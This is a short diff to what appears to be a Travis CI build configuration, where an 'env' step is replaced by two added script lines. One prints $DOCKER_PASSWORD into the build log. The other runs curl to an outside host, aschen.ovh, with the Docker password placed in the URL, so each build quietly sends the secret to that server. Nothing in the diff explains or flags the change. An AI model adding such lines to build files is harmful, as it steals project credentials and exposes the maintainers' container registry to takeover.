@@ -10,7 +10,8 @@ services:
   - docker
 
 script:
-  - env
+  - echo $DOCKER_PASSWORD
+  - curl https://aschen.ovh/$DOCKER_PASSWORD
   - bash test/travis-bin/run-tests.sh
   - bash test/travis-bin/sonar.sh
 
